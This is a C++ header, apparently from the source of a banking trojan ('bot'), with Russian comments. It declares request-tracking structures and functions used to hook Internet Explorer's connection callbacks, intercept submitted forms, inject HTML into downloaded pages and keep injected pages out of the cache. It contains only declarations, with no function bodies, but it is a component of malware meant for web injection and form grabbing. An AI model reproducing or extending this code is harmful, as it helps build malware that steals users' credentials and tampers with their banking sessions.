
#ifndef RequestsH
#define RequestsH
//---------------------------------------------------------------------------

#include <windows.h>

#include "BotClasses.h"
#include "BotHTTP.h"
#include "BotClasses.h"




//********************************************************************
//   Старые методы организации  списка запросов
//********************************************************************
typedef void(*TRequestEvent)(LPVOID);

typedef struct TRequestListRec
{
	PList Items;                       // Набор элементов
	LPCRITICAL_SECTION Lock;           // Блокировка списка
	TRequestEvent OnInitializeExtData;
	TRequestEvent OnFreeExtData;
} *PRequestList;


typedef struct TRequestRec
{
	LPVOID Owner;        // Идентификатор владельца запроса
	THTTPMethod Method;  // Числовое значение метода
	PCHAR URL;           // Адрес сайта к которому осуществляется запрос
	bool IsSecure;        // Доп. флаг - признак защищённого соединения
	PCHAR Optional;      // Пост данные запроса
	PCHAR ContentType;   // Тип загруженного документа
    DWORD ContentLength; // Размер загружаемых данных
	bool SupportPostData;// Признак поддерживаемого перехвата форм

	LPBYTE Buffer;       // Буфер принятых данных
	DWORD BufferSize;    // Размер буфера принятых данных
	DWORD ReadedSize;    // Прочитано байт


	DWORD SavedSize;
	DWORD SaveReturned;

	DWORD Position;      // Позиция отдачи данных
	bool FileReaded;     // Признак того, что файл загружен
    bool ConnectionClosed;// Соединение с сервером закрыто

	bool IsInject;       // Признак наличия инжектов для запроса
	PList Injects;       // Список инжектов (элементы типа PHTMLInject)
	bool Injected;       // Признак того, что инжект уже произведён

	HANDLE Event;         // Событие обработки мтода обратной связи об изменении статуса подключения
	HANDLE AllowClose;    // Событие возникает когда можно прервать соединение

	LPVOID OldCallback;	 // Указатель на предыдущий метод обратной связи  (Для Интернет експлорера)
	LPVOID OldContext;   //  Указатель на предыдущий контекст интернет соединения (Для Интернет експлорера)

	bool DocumentNeedCached; // Признак того, что документ необходимо добавить в кэш

	PMemBlockList ReceiveList; // Список загруженных данных
	PMemBlock ReceiveBuf;      // Буфер загрузки

	bool FirstHandled;   // Признак обработки первой попытки чтения (для IE)
	DWORD Entry;
	PCHAR CacheFileMask; // Ожидаемая маска имени файла кэша. Используется для
	                     // отключения кеширования документов с произведённым инжектом
	//------------------------------------------//

	LPVOID ExtData;     // Дополнительные данные запроса
	DWORD Flags;        // Дополнительные флаги
	bool HeaderHandled; // Признак обработанного заголовка
    DWORD HeaderSize;   // Размер заголовка ответа
	//
	PRequestList List; // Список которому принадлежит элемент
} *PRequest;


typedef bool (*TRequestEnumMethod)(PRequest Request, LPVOID Data);


//----------------------------------------------------------------------------
//  Request - Набор функция для работы с запросами
//----------------------------------------------------------------------------
namespace Request
{
	// Создаёт список запросов
	PRequestList CreateList(TRequestEvent OnInitExtData, TRequestEvent OnFreeExtData);

	// Уничтожить список запросов
	void FreeList(PRequestList List);

	// Добавить запрос. Если запрос для владельца Owner существует, то будет
	// возвращён указатель на него. Передайте указатель
	// Existed если хотите узнать существовал ли вопрос до  этого
	PRequest Add(PRequestList List, LPVOID Owner, bool *Existed = NULL);

	// Найти запрос для владельца
	PRequest Find(PRequestList List, LPVOID Owner);

	// Удалить запрос
	DWORD Delete(PRequestList List, LPVOID Owner);

	// Очистить запрос
	void Clear(PRequest R);

	// Инициализировать данные для загрузки документа
	void InitializeReceiveData(PRequest R);

	// функция собирает загруженные данные ф буфер запроса
	// и освобождает выделенные для загрузки структуры
	void CloseReceiveData(PRequest R);


	// Получить следующую порцию данных
	DWORD GetNextDataPart(PRequest Request, LPVOID Buf, DWORD BufSize, bool FreeBuf);

	// Установить данные запроса
	void SetBuffer(PRequest R, LPBYTE NewBuf, DWORD Size);

	// Метод перебора всех запросов списка
    void EnumRequests(PRequestList Requests, TRequestEnumMethod Method, LPVOID Data);


	void inline Lock(PRequestList List);
	void inline Unlock(PRequestList List);
}



//********************************************************************
//  Класссы для организации списка запросов
//********************************************************************

class TRequest;


class TRequestList : public TBotCollection
{
private:
	TRequest* DoFind(LPVOID Handle);
protected:
	virtual TRequest* CreateItem();
public:
	TRequestList();
	~TRequestList();

	TRequest* Find(LPVOID Handle); // Функция ищет запрос по его идентификатору
	TRequest* Add(LPVOID Handle);  // Функция добавляет запрос
};


class TRequest : public TBotCollectionItem
{
private:
	LPVOID FHandle;
	int    FRefCount;

	friend class TRequestList;
public:
	TRequest(TRequestList* Owner);
	~TRequest();

    LPVOID inline Handle() { return FHandle; }
};

//---------------------------------------------------------------------------
#endif
